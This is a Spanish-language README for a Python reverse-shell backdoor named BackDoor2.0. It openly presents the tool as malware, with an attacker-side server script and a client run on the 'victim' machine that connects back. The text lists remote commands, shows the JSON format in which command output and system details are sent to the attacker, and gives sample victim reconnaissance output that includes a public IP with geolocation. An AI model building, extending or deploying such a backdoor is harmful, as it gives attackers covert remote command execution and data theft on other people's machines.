# BackDoor2.0
Esta es la version 2.0 de la anterior BackDoor base85, en esta nueva version estoy trabajando para poder anadir a la conexiones un cifrado AES. el malware todabia no se puede usar en modo trafico encriptado, pero si en trafico plano(sin encriptacion). <br>
la back door usa una conexion inversa,  siendo el script server.py el ejecutar en la maquina del atacante y el exec.py en la maquina objetivo. ambos reciben por parametro el puerto para establecer la conexion. <br>
Se a de configurar la direcion ip del archivo exec.py con su ip publica o direcion de tunel para la conexion. <br>
El malware transmite los datos en formato json ya que son mas faciles de tratar, siendo la estructura parecida a la siguiente:
self._Comando = {
	"cursor" : self._Cursor,
	"comando-data":getoutput(self._Comando),  
	"tiempo actual" : self.Time,
	"ruta actual" : self._cwd,
}
donde self.Time equivale al tiempo en la maaquina victima, self._cwd el directorio actual, self._Cursor el Cursor o barra de estado y getoutput(self._Comando) la salida del comando ejecutado.

la back door dispone de estos comando generales:  (proximamente mas...)
-  cd                    comando para desplazase por carpetas haciendo usa de la funcion os.chdir()
-  cwd                   extrae la ruta del directorio actual mediante la fun os.getcwd()
-  systeminfo            extrae info del pc objetivo
-  exit                  cierra las conexiones y finaliza el programa en la maquina victima y atacante
-  BufferServer          muestra el buffer del servidos
-  BufferServerChange    permite cambiar el buffer del server, pero no es necesario ya que el malware es capaz de calcular la cantidad necesaria en cada transmision

systeminfo da al atacante la info baica de la maquina objetivo, ejemplo:
[*] El sistema operativo victima es: Linux
[*] Tiempo actual: 2021/3/21 20:57:47
[*] Directorio: /home/desmon/Desktop/back door
[*] Nombre del equipo: desmon/desmon
[*] Ip publica de la maquina es: ['99.179.213.144', {'Latitud': '29.5040016174', 'Longitud': '-0.4200999963'}]
[*] Buffer Cliente: 4096
[*] Tipo de conexion: <socket.socket fd=10, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 40066), raddr=('127.0.0.1', 8003)>
[*] Ejecutable de pythhon con el que se ejecuta: ('64bit', 'ELF')
[*] Estructura: x86_64
[*] Sistema operativo: Linux-5.10.16-arch1-1-x86_64-with-glibc2.33
[*] Nombre real del Procesador: 
[*] Info de la version python: ('default', 'Feb  6 2021 06:49:13')
[*] Compilador de python: GCC 10.2.0
[*] Implementacion de python: CPython
[*] Version del sistema: 5.10.16-arch1-1
[*] 
[*] uname_result(system='Linux', node='desmon', release='5.10.16-arch1-1', version='#1 SMP PREEMPT Sat, 13 Feb 2021 20:50:18 +0000', machine='x86_64')
